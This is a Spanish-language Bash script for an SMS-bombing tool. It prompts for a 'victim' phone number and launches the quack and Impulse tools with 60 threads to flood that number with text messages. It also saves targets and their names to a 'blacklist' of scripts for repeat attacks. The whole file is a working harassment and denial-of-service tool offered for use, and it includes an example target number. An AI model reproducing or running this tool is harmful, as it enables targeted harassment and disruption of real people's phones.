#!/bin/bash
#
# target: (26/01/2021)
#
# [Open Source] - [Código Abierto]
#
# Variables y Colores
#
PWD=$(pwd)
OS=$(uname -o)
USER=$(id -u)
verde='\033[32m'
blanco='\033[37m'
rojo='\033[31m'
azul='\033[34m'
negro='\033[0;30m'
rosa='\033[38;5;207m'
amarillo='\033[33m'
morado='\033[35m'
cian='\033[1;36m'
magenta='\033[1;35m'
#
# Mensaje de Opción Incorrecta
#
function Error {
echo -e "${rojo}
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 0.5
}
#
# Banner SETSMS
#
function SETSMS {
	sleep 0.5
	clear
echo -e "${blanco}
  _____  _               _____ _    _ ______ 
 |  __ \| |        /\   / ____| |  | |  ____|
 | |__) | |       /  \ | |  __| |  | | |__   
 |  ___/| |      / /\ \| | |_ | |  | |  __|  
 | |    | |____ / ____ \ |__| | |__| | |____ 
 |_|    |______/_/    \_\_____|\____/|______|
                                             
                                            "${blanco}
}
#
# Solicitando Número Telefónico
#
function PhoneNumber {
SETSMS
echo -e -n "${verde}
┌════════════════════════════┐
█ ${blanco}PON EL NUMERO DE LA VICTIMA ${rojo}█
└════════════════════════════┘
┃    ┌═════════┐  ┌═══════════════┐
└═>>>█ ${blanco}EJEMPLO ${rojo}█=>█ ${azul}+593981480757 ${rojo}█
┃    └═════════┘  └═══════════════┘
┃    ┌════════════════════════════════════════┐
└═>>>█ ${rojo}RECUERDA PONER EL NUMERO TODO JUNTO ${rojo}█
┃    └════════════════════════════════════════┘
┃
└═>>> "${blanco}
read -r PHONE
sleep 0.5

echo -e "${rojo}
           ┌═════════════════┐
           █ ${azul}EL NÚMERO FUE GUARDADO ${rojo}█
           └═════════════════┘
   ┌═════════════════════════════════┐
   █ ${blanco}SI YÁ USÓ ÉSTA HERRAMIENTA EN        ${rojo}█
   █ ${blanco}EL NUMERO, TIENE QUE                 ${rojo}█
   █ ${blanco}ESPERA 24 HORAS PARA USARLA OTRA VEZ ${rojo}█
   █ ${blanco}EN EL NUMERO,                        ${rojo}█
   █ ${blanco}SI NO ESPERA, PUEDE QUE LA           ${rojo}█
   █ ${blanco}HERRAMIENTA NO RESPONDA CON LA       ${rojo}█
   █ ${blanco}LA MISMA CANTIDAD DE MENSAJES        ${rojo}█
   █ ${blanco}QUE ENVIO LA PRIMERA VEZ...          ${rojo}█
   └═════════════════════════════════┘
 ┌══════════════════════════════════════┐
 █ ${rojo}EL SPAM DE SMS DURARA DE 2 A 3       ${verde}█
 █ ${rojo}MINUTOS, SI QUIERE, PUEDE CANCELAR   ${verde}█
 █ ${rojo}EL PROCESO Y ENVÍO DE SMS,           ${verde}█
 █ ${rojo}CON LA SIGUIENTE CONBINACION...      ${verde}█
 └══════════════════════════════════════┘
            ┌══════┐   ┌═══┐
            █ ${azul}CTRL ${rojo}█ + █ ${azul}C ${rojo}█
            └══════┘   └═══┘
┌═════════════════════════════════════════┐
█ ${blanco}PULSE ENTER PARA INICIAR EL SPAM DE SMS ${rojo}█
└═════════════════════════════════════════┘
"${blanco}
read
}
#
# Llamando a las Herramientas Quack e Impulse
#
function SendSMS {
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}
}
function Backup {
SETSMS
echo -e -n "${rojo}
┌════════════════════════════════════┐
█ ${blanco}¿QUIERES GUARDAR EL NUMERO EN LA BLACKLISR? ${rojo}█
└════════════════════════════════════┘
┃
└═>>> ┃${azul} ${PHONE} ${rojo}┃
┃
┃    ┌═══════════════════┐
└═>>>█ [${blanco}01${rojo}] ┃ ${blanco}GUARDAR ${rojo}█
┃    └═══════════════════┘
┃    ┌═══════════════════┐
└═>>>█ [${blanco}02${rojo}] ┃ ${blanco}NO GUARDAR ${rojo}█
┃    └═══════════════════┘
┃
└═>>> "${blanco}
read -r SCRIPT
sleep 0.5

if [[ ${SCRIPT} == 1 || ${SCRIPT} == 01 ]]; then
echo -e -n "${rojo}
┌══════════════════════════════════┐
█ ${blanco}NOMBRE PARA EL NUMERO ? ${rojo}█
└══════════════════════════════════┘
┃    ┌═════════┐  ┌═════════┐
└═>>>█ ${blanco}EJEMPLO ${rojo}█=>█ ${azul}AntPlague ${rojo}█
┃    └═════════┘  └═════════┘
┃
└═>>> "${blanco}
read -r NAME
sleep 0.5
echo -e "PHONE='${PHONE}'" >> ${RUTA}/tools/list.sh
echo -e "NAME='${NAME}'" >> ${RUTA}/tools/list.sh
echo -e 'echo -e "${blanco}${NAME} ${rojo}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/list.sh
echo -e "NUMERO='${PHONE}'" >> ${RUTA}/tools/spam.sh
echo -e "NOMBRE='${NAME}'" >> ${RUTA}/tools/spam.sh
echo -e 'echo -e "${rojo}
┌══════════┐
█ ${blanco}VICTIMA ${rojo}█
└══════════┘
${blanco}
${NAME} ${ROJO}=>${azul} ${PHONE}"
sleep 1' >> ${RUTA}/tools/spam.sh
echo -e "source ${RUTA}/numbers/${NAME}.sh" >> ${RUTA}/tools/spam.sh
echo -e "#!/bin/bash
cd ${RUTA}/quack
python3 quack --tool SMS --target ${PHONE} --threads 60 --timeout 90
cd ${RUTA}/Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${PHONE}
cd ${RUTA}" >> ${RUTA}/numbers/${NAME}.sh
echo -e "${rojo}
┌══════════════════════════════┐
█ ${blanco}NÚMERO GUARDADO EN LISTA NEGRA ${rojo}█
└══════════════════════════════┘
┃
└═>>>${blanco} ${RUTA}/numbers/${NAME}.sh"${blanco}
elif [[ ${SCRIPT} == 2 || ${SCRIPT} == 02 ]]; then
exit
else
Error
Backup
fi
}
#
# Regresando al Menu Principal
#
function Restart {
echo -e "${rojo}
┌════════════════════════════┐
█ ${blanco}PULSE ENTER PARA SEGUIR ${rojo}█
└════════════════════════════┘"${blanco}
read
source ${RUTA}/SETSMS.sh
}
#
# Declarando Funciones
#
PhoneNumber
SendSMS
Backup
Restart
